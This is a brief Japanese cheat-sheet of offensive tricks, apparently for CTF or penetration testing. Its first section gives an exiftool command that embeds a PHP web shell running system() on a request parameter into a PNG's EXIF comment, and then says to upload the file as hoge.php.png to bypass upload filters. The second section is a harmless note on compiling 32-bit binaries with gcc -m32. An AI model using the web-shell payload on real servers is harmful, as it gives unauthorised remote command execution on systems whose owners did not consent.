# Other technic

## exif情報
exifに埋め込む

```
$ exiftool -Comment='<?php system($_REQUEST['cmd']); ?>' hoge.png
```

これでhoge.php.pngとしてupload

## クロスコンパイル

```
gcc -m32 prog.c
```

[64bit Linuxで32bit ELFをコンパイル](https://qiita.com/mas9612/items/d680a5b4307bafd2d3a0)
